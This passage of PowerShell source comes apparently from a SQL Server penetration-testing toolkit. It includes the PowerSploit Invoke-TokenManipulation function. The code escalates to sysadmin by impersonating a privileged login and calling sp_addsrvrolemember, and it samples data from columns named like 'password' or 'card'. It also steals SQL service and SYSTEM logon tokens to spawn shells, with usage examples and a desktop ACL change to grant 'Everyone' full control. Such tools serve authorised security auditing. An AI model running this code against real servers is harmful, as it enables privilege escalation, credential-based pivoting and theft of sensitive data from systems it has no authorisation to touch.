        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # ---------------------------------------------------------------
        # Check for Vulnerability
        # ---------------------------------------------------------------

        # Get list of SQL Server logins that can be impersonated by the current login
        $ImpersonationList = Get-SQLServerPriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.PermissionName -like 'IMPERSONATE'
        }

        # Check if any SQL Server logins can be impersonated
        if($ImpersonationList)
        {
            # Status user
            Write-Verbose -Message "$Instance : - Logins can be impersonated."
            $IsVulnerable = 'Yes'

            # ---------------------------------------------------------------
            # Check if Vulnerability is Exploitable
            # ---------------------------------------------------------------

            # Iterate through each affected login and check if they are a sysadmin
            $ImpersonationList |
            ForEach-Object -Process {
                # Grab grantee and impersonable login
                $ImpersonatedLogin = $_.ObjectName
                $GranteeName = $_.GranteeName

                # Check if impersonable login is a sysadmin
                $ImpLoginSysadminStatus = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$ImpersonatedLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                If($ImpLoginSysadminStatus -eq 1)
                {
                    #Status user
                    Write-Verbose -Message "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin sysadmin login."
                    $IsExploitable = 'Yes'
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin SYSADMIN login. This test was ran with the $CurrentLogin login."

                    # ---------------------------------------------------------------
                    # Exploit Vulnerability
                    # ---------------------------------------------------------------
                    if($Exploit)
                    {
                        # Status user
                        Write-Verbose -Message "$Instance : - EXPLOITING: Starting exploit process..."

                        # Check if user is already a sysadmin
                        $SysadminPreCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                        if($SysadminPreCheck -eq 0)
                        {
                            # Status user
                            Write-Verbose -Message "$Instance : - EXPLOITING: Verified that the current user ($CurrentLogin) is NOT a sysadmin."
                            Write-Verbose -Message "$Instance : - EXPLOITING: Attempting to add the current user ($CurrentLogin) to the sysadmin role by impersonating $ImpersonatedLogin..."

                            # Attempt to add the current login to sysadmins fixed server role
                            $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "EXECUTE AS LOGIN = '$ImpersonatedLogin';EXEC sp_addsrvrolemember '$CurrentLogin','sysadmin';Revert" -SuppressVerbose

                            # Verify the login was added successfully
                            $SysadminPostCheck = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "SELECT IS_SRVROLEMEMBER('sysadmin','$CurrentLogin') as Status" -SuppressVerbose | Select-Object -Property Status -ExpandProperty Status
                            if($SysadminPostCheck -eq 1)
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was possible to make the current user ($CurrentLogin) a sysadmin!"
                                $Exploited = 'Yes'
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - EXPLOITING: It was not possible to make the current user ($CurrentLogin) a sysadmin."
                            }
                        }
                        else
                        {
                            # Status user
                            Write-Verbose -Message "$Instance : - EXPLOITING: The current login ($CurrentLogin) is already a sysadmin. No privilege escalation needed."
                            $Exploited = 'No'
                        }
                    }
                }
                else
                {
                    # Status user
                    Write-Verbose -Message "$Instance : - $GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin)."
                    $Details = "$GranteeName can impersonate the $ImpersonatedLogin login (not a sysadmin). This test was ran with the $CurrentLogin login."
                    $IsExploitable = 'No'
                }

                # Add record
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            # Status user
            Write-Verbose -Message "$Instance : - No logins could be impersonated."
        }

        # Status user
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: PERMISSION - IMPERSONATE LOGIN"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditSampleDataByColumn
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditSampleDataByColumn
{
    <#
            .SYNOPSIS
            Check if the current login can access any database columns that contain the word password. Supports column name keyword search and custom data sample size.
            Note: For cleaner data sample output use the Get-SQLColumnSampleData function.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER NoOutput
            Don't output anything.
            .PARAMETER Exploit
            Exploit vulnerable issues
            .PARAMETER SampleSize
            Number of records to sample.
            .PARAMETER Keyword
            Column name to search for.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditSampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Keyword card -SampleSize 2 -Exploit

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Potentially Sensitive Columns Found
            Description   : Columns were found in non default databases that may contain sensitive information.
            Remediation   : Ensure that all passwords and senstive data are masked, hashed, or encrypted.
            Severity      : Informational
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : Yes
            ExploitCmd    : Invoke-SQLAuditSampleDataByColumn -Instance SQLServer1\STANDARDDEV2014 -Exploit
            Details       : Data sample from [testdb].[dbo].[tracking].[card] : "4111111111111111" "4111111111111112".
            Reference     : https://msdn.microsoft.com/en-us/library/ms188348.aspx
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Number of records to sample.')]
        [int]$SampleSize = 1,

        [Parameter(Mandatory = $false,
        HelpMessage = ' Column name to search for.')]
        [string]$Keyword = 'Password'
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: SEARCH DATA BY COLUMN"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED"
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS"
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Potentially Sensitive Columns Found'
        $Description   = 'Columns were found in non default databases that may contain sensitive information.'
        $Remediation   = 'Ensure that all passwords and senstive data are masked, hashed, or encrypted.'
        $Severity      = 'Informational'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = "Invoke-SQLAuditSampleDataByColumn -Instance $Instance -Exploit"
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms188348.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        Write-Verbose -Message "$Instance : - Searching for column names that match criteria..."
        $Columns = Get-SQLColumn -Instance $Instance -Username $Username -Password $Password -Credential $Credential -ColumnNameSearch $Keyword -NoDefaults -SuppressVerbose
        if($Columns)
        {
            $IsVulnerable  = 'Yes'
        }
        else
        {
            $IsVulnerable  = 'No'
        }

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        if($IsVulnerable -eq 'Yes')
        {
            # List affected columns
            $Columns|
            ForEach-Object -Process {
                $DatabaseName = $_.DatabaseName
                $SchemaName = $_.SchemaName
                $TableName = $_.TableName
                $ColumnName = $_.ColumnName
                $AffectedColumn = "[$DatabaseName].[$SchemaName].[$TableName].[$ColumnName]"
                $AffectedTable = "[$DatabaseName].[$SchemaName].[$TableName]"
                $Query = "USE $DatabaseName; SELECT TOP $SampleSize [$ColumnName] FROM $AffectedTable "

                Write-Verbose -Message "$Instance : - Column match: $AffectedColumn"

                # ------------------------------------------------------------------
                # Exploit Vulnerability
                # Note: Add the current user to sysadmin fixed server role, get data
                # ------------------------------------------------------------------
                if($IsVulnerable -eq 'Yes')
                {
                    $TblTargetColumns |
                    ForEach-Object -Process {
                        # Add sample data
                        Write-Verbose -Message "$Instance : - EXPLOITING: Selecting data sample from column $AffectedColumn."

                        # Query for data
                        $DataSample = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query $Query -SuppressVerbose |
                        ConvertTo-Csv -NoTypeInformation |
                        Select-Object -Skip 1
                        if($DataSample)
                        {
                            $Details = "Data sample from $AffectedColumn : $DataSample."
                        }
                        else
                        {
                            $Details = "No data found in affected column: $AffectedColumn."
                        }
                        $IsExploitable = 'Yes'
                        $Exploited = 'Yes'

                        # Add record
                        $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                    }
                }
                else
                {
                    # Add affected column list
                    $Details = "Affected column: $AffectedColumn."
                    $IsExploitable = 'Yes'
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
                }
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No columns were found that matched the search."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: SEARCH DATA BY COLUMN"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLImpersonateServiceCmd
# ---------------------------------------
# Author: Scott Sutherland (Invoke-TokenManipulation wrapper)
# Author:  Joe Bialek (Invoke-TokenManipulation)
Function Invoke-SQLImpersonateServiceCmd
{
    <#
            .SYNOPSIS
            This function will download the Invoke-TokenManipulation function written by Joe Bialek and use it 
            to impersonate local SQL Server service accounts in order to gain sysadmin privileges on local 
            SQL Server instances.  By default, the function will open a cmd.exe for all local services used 
            by SQL Server.  However, an alternative executable can also be provided (like ssms and PowerShell). 
            Note1: This function requires local administrative or localsystem privileges.
            Note2: Currently, this function only supports local execution, but it can be run remotely via WMI or
            PowerShell remoting.
            .PARAMETER Instance
            SQL Server instance to connection to. If no instance is provided this script will open a seperate cmd.exe
            running in the context of each SQL Server service.
            .PARAMETER Exe
            Executable to run.
            .PARAMETER EngineOnly
            Only run command in the context of SQL Server database engine service accounts.
            .EXAMPLE
            This will pop up a cmd.exe console for every service used by SQL Server on the local system, and
            the cmd.exe will be running in the context of the associated service account.
            PS C:\> Invoke-SQLImpersonateServiceCmd            
            .EXAMPLE
            This will pop up a cmd.exe consoles running as the SQL Server service accounts associated with 
            the provided SQL Server instance.
            PS C:\> Get-SQLInstanceLocal | Invoke-SQLImpersonateServiceCmd -Verbose
            .EXAMPLE
            This will pop up a cmd.exe consoles running as the SQL Server service accounts associated with 
            the provided SQL Server instance.
            the cmd.exe will be running in the context of the associated service account.
            PS C:\> Invoke-SQLImpersonateServiceCmd -Verbose -Instance SQLServer1\STANDARDDEV2014
            .EXAMPLE
            This will run the provided powershell command as the SQL Server datbase engine service account associated with the 
            provided instance.             
            PS C:\> Invoke-SQLImpersonateServiceCmd -Verbose -Instance SQLServer1\STANDARDDEV2014 -EngineOnly -Exe 'PowerShell -c "notepad.exe"'
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Executable to run. Cmd.exe and Ssms.exe are recommended.')]
        [string]$Exe = 'cmd.exe',

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Only run commands in the context of SQL Server database engine service accounts.')]
        [switch]$EngineOnly
    )

    Begin {
        
        # Check if the current process has elevated privs
        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
        Write-Verbose "Verifying local adminsitrator privileges..."
        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
        $IsAdmin = $prp.IsInRole($adm)
        if($IsAdmin){
             Write-Verbose "The current user has local administrator privileges."
        }else{
             Write-Verbose "The current user DOES NOT have local administrator privileges. Aborting."
             return
        }
    }

    Process {

        # Status user        
        Write-Output "Note: The verbose flag will give you more info if you need it."

        # Get SQL services
        Write-Verbose "Gathering list of SQL Server services running locally..."
        if($EngineOnly){
            $LocalSQLServices = Get-SQLServiceLocal -Instance $Instance -RunOnly | Where-Object {$_.ServicePath -like "*sqlservr.exe*"}  | Sort-Object Instance
            Write-Verbose "Only the database engine service accounts will be targeted."
        }else{
            $LocalSQLServices = Get-SQLServiceLocal -Instance $Instance -RunOnly | Sort-Object Instance
        }

        # Get running processes
        Write-Verbose "Gathering list of local processes..."
        $LocalProcesses = Get-WmiObject -Class win32_process | Select-Object processid,ExecutablePath
        
        Write-Verbose "Targeting SQL Server processes..."        

        # Grab SQL Service executable inforrmation
        $LocalSQLServices |
        ForEach-Object {
            
            $s_pathname = $_.ServicePath.Split("`"")[1]
            $s_displayname = $_.ServiceDisplayName
            $s_serviceaccount = $_.ServiceAccount   
            $s_instance = $_.Instance  
                        
            # Grab process information
            $LocalProcesses | 
            ForEach-Object {
  
                $p_ExecutablePath = $_.ExecutablePath
                $p_processid = $_.processid

                # Run executable as service account
                if($s_pathname -like "$p_ExecutablePath"){

                    Write-Output "$s_instance - Service: $s_displayname - Running command `"$Exe`" as $s_serviceaccount"

                    # Setup command
                    $MyCmd = "/C $Exe"

                    # Run command                    
                    Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ProcessArgs $MyCmd -ProcessId $p_processid -ErrorAction SilentlyContinue

                    # 
                }
            }               
        }               
    }

    End {
    
        # Status user
        Write-Output "All done."
    }
}


#endregion

#########################################################################
#
#region          THIRD PARTY FUNCTIONS
#
#########################################################################


# -------------------------------------------
# Function: Invoke-TokenManipulation
# -------------------------------------------
# Author: Joe Bialek, Twitter: @JosephBialek
function Invoke-TokenManipulation
{
<#
.SYNOPSIS

This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
This functionality is very similar to the incognito tool (with some differences, and different use goals).

This script can also make the PowerShell thread impersonate another users Logon Token. Unfortunately this doesn't work well, because PowerShell
creates new threads to do things, and those threads will use the Primary token of the PowerShell process (your original token) and not the token
that one thread is impersonating. Because of this, you cannot use thread impersonation to impersonate a user and then use PowerShell remoting to connect
to another server as that user (it will authenticate using the primary token of the process, which is your original logon token).

Because of this limitation, the recommended way to use this script is to use CreateProcess to create a new PowerShell process with another users Logon 
Token, and then use this process to pivot. This works because the entire process is created using the other users Logon Token, so it will use their
credentials for the authentication.

IMPORTANT: If you are creating a process, by default this script will modify the ACL of the current users desktop to allow full control to "Everyone". 
This is done so that the UI of the process is shown. If you do not need the UI, use the -NoUI flag to prevent the ACL from being modified. This ACL
is not permenant, as in, when the current logs off the ACL is cleared. It is still preferrable to not modify things unless they need to be modified though,
so I created the NoUI flag. ALSO: When creating a process, the script will request SeSecurityPrivilege so it can enumerate and modify the ACL of the desktop.
This could show up in logs depending on the level of monitoring.


PERMISSIONS REQUIRED:
SeSecurityPrivilege: Needed if launching a process with a UI that needs to be rendered. Using the -NoUI flag blocks this.
SeAssignPrimaryTokenPrivilege : Needed if launching a process while the script is running in Session 0.


Important differences from incognito:
First of all, you should probably read the incognito white paper to understand what incognito does. If you use incognito, you'll notice it differentiates
between "Impersonation" and "Delegation" tokens. This is because incognito can be used in situations where you get remote code execution against a service
which has threads impersonating multiple users. Incognito can enumerate all tokens available to the service process, and impersonate them (which might allow
you to elevate privileges). This script must be run as administrator, and because you are already an administrator, the primary use of this script is for pivoting
without dumping credentials. 

In this situation, Impersonation vs Delegation does not matter because an administrator can turn any token in to a primary token (delegation rights). What does
matter is the logon type used to create the logon token. If a user connects using Network Logon (aka type 3 logon), the computer will not have any credentials for 
the user. Since the computer has no credentials associated with the token, it will not be possible to authenticate off-box with the token. All other logon types
should have credentials associated with them (such as Interactive logon, Service logon, Remote interactive logon, etc). Therefore, this script looks
for tokens which were created with desirable logon tokens (and only displays them by default).

In a nutshell, instead of worrying about "delegation vs impersonation" tokens, you should worry about NetworkLogon (bad) vs Non-NetworkLogon (good).


PowerSploit Function: Invoke-TokenManipulation
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.11
(1.1 -> 1.11: PassThru of System.Diagnostics.Process object added by Rune Mariboe, https://www.linkedin.com/in/runemariboe)

.DESCRIPTION

Lists available logon tokens. Creates processes with other users logon tokens, and impersonates logon tokens in the current thread.

.PARAMETER Enumerate

Switch. Specifics to enumerate logon tokens available. By default this will only list unqiue usable tokens (not network-logon tokens).

.PARAMETER RevToSelf

Switch. Stops impersonating an alternate users Token.

.PARAMETER ShowAll

Switch. Enumerate all Logon Tokens (including non-unique tokens and NetworkLogon tokens).

.PARAMETER ImpersonateUser

Switch. Will impersonate an alternate users logon token in the PowerShell thread. Can specify the token to use by Username, ProcessId, or ThreadId.
    This mode is not recommended because PowerShell is heavily threaded and many actions won't be done in the current thread. Use CreateProcess instead.
	
.PARAMETER CreateProcess

Specify a process to create with an alternate users logon token. Can specify the token to use by Username, ProcessId, or ThreadId.
	
.PARAMETER WhoAmI

Switch. Displays the credentials the PowerShell thread is running under.

.PARAMETER Username

Specify the Token to use by username. This will choose a non-NetworkLogon token belonging to the user.

.PARAMETER ProcessId

Specify the Token to use by ProcessId. This will use the primary token of the process specified.

.PARAMETER Process

Specify the token to use by process object (will use the processId under the covers). This will impersonate the primary token of the process.

.PARAMETER ThreadId

Specify the Token to use by ThreadId. This will use the token of the thread specified.

.PARAMETER ProcessArgs

Specify the arguments to start the specified process with when using the -CreateProcess mode.

.PARAMETER NoUI

If you are creating a process which doesn't need a UI to be rendered, use this flag. This will prevent the script from modifying the Desktop ACL's of the 
current user. If this flag isn't set and -CreateProcess is used, this script will modify the ACL's of the current users desktop to allow full control
to "Everyone".

.PARAMETER PassThru

If you are creating a process, this will pass the System.Diagnostics.Process object to the pipeline.

	
.EXAMPLE

Invoke-TokenManipulation -Enumerate

Lists all unique usable tokens on the computer.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authority\system"

Spawns cmd.exe as SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -ImpersonateUser -Username "nt authority\system"

Makes the current PowerShell thread impersonate SYSTEM.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500

Spawns cmd.exe using the primary token belonging to process ID 500.

.EXAMPLE

Invoke-TokenManipulation -ShowAll

Lists all tokens available on the computer, including non-unique tokens and tokens created using NetworkLogon.

.EXAMPLE

Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500

Spawns cmd.exe using the token belonging to thread ID 500.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"

Spawns cmd.exe using the primary token of LSASS.exe. This pipes the output of Get-Process to the "-Process" parameter of the script.

.EXAMPLE

(Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe" -PassThru).WaitForExit()

Spawns cmd.exe using the primary token of LSASS.exe. Then holds the spawning PowerShell session until that process has exited.

.EXAMPLE

Get-Process wininit | Invoke-TokenManipulation -ImpersonateUser

Makes the current thread impersonate the lsass security token.

.NOTES
This script was inspired by incognito. 

Several of the functions used in this script were written by Matt Graeber(Twitter: @mattifestation, Blog: http://www.exploit-monday.com/).
BIG THANKS to Matt Graeber for helping debug.

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell
Blog on this script: http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/

#>

    [CmdletBinding(DefaultParameterSetName="Enumerate")]
    Param(
        [Parameter(ParameterSetName = "Enumerate")]
        [Switch]
        $Enumerate,

        [Parameter(ParameterSetName = "RevToSelf")]
        [Switch]
        $RevToSelf,

        [Parameter(ParameterSetName = "ShowAll")]
        [Switch]
        $ShowAll,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Switch]
        $ImpersonateUser,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $CreateProcess,

        [Parameter(ParameterSetName = "WhoAmI")]
        [Switch]
        $WhoAmI,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $Username,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        [Int]
        $ProcessId,

        [Parameter(ParameterSetName = "ImpersonateUser", ValueFromPipeline=$true)]
        [Parameter(ParameterSetName = "CreateProcess", ValueFromPipeline=$true)]
        [System.Diagnostics.Process]
        $Process,

        [Parameter(ParameterSetName = "ImpersonateUser")]
        [Parameter(ParameterSetName = "CreateProcess")]
        $ThreadId,

        [Parameter(ParameterSetName = "CreateProcess")]
        [String]
        $ProcessArgs,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $NoUI,

        [Parameter(ParameterSetName = "CreateProcess")]
        [Switch]
        $PassThru,

        [Parameter(Mandatory = $false,ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance
    )
   
    Set-StrictMode -Version 2

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}

    ###############################
    #Win32Constants
    ###############################
    $Constants = @{
        ACCESS_SYSTEM_SECURITY = 0x01000000
        READ_CONTROL = 0x00020000
        SYNCHRONIZE = 0x00100000
        STANDARD_RIGHTS_ALL = 0x001F0000
        TOKEN_QUERY = 8
        TOKEN_ADJUST_PRIVILEGES = 0x20
        ERROR_NO_TOKEN = 0x3f0
        SECURITY_DELEGATION = 3
        DACL_SECURITY_INFORMATION = 0x4
        ACCESS_ALLOWED_ACE_TYPE = 0x0
        STANDARD_RIGHTS_REQUIRED = 0x000F0000
        DESKTOP_GENERIC_ALL = 0x000F01FF
        WRITE_DAC = 0x00040000
        OBJECT_INHERIT_ACE = 0x1
        GRANT_ACCESS = 0x1
        TRUSTEE_IS_NAME = 0x1
        TRUSTEE_IS_SID = 0x0
        TRUSTEE_IS_USER = 0x1
        TRUSTEE_IS_WELL_KNOWN_GROUP = 0x5
        TRUSTEE_IS_GROUP = 0x2
        PROCESS_QUERY_INFORMATION = 0x400
        TOKEN_ASSIGN_PRIMARY = 0x1
        TOKEN_DUPLICATE = 0x2
        TOKEN_IMPERSONATE = 0x4
        TOKEN_QUERY_SOURCE = 0x10
        STANDARD_RIGHTS_READ = 0x20000
        TokenStatistics = 10
        TOKEN_ALL_ACCESS = 0xf01ff
        MAXIMUM_ALLOWED = 0x02000000
        THREAD_ALL_ACCESS = 0x1f03ff
        ERROR_INVALID_PARAMETER = 0x57
        LOGON_NETCREDENTIALS_ONLY = 0x2
        SE_PRIVILEGE_ENABLED = 0x2
        SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x1
        SE_PRIVILEGE_REMOVED = 0x4
    }

    $Win32Constants = New-Object PSObject -Property $Constants
    ###############################


    ###############################
    #Win32Structures
    ###############################
	#Define all the structures/enums that will be used
	#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
	$Domain = [AppDomain]::CurrentDomain
	$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
	$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
	$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]

    #ENUMs
	$TypeBuilder = $ModuleBuilder.DefineEnum('TOKEN_INFORMATION_CLASS', 'Public', [UInt32])
	$TypeBuilder.DefineLiteral('TokenUser', [UInt32] 1) | Out-Null
    $TypeBuilder.DefineLiteral('TokenGroups', [UInt32] 2) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrivileges', [UInt32] 3) | Out-Null
    $TypeBuilder.DefineLiteral('TokenOwner', [UInt32] 4) | Out-Null
    $TypeBuilder.DefineLiteral('TokenPrimaryGroup', [UInt32] 5) | Out-Null
    $TypeBuilder.DefineLiteral('TokenDefaultDacl', [UInt32] 6) | Out-Null
    $TypeBuilder.DefineLiteral('TokenSource', [UInt32] 7) | Out-Null
    $TypeBuilder.DefineLiteral('TokenType', [UInt32] 8) | Out-Null
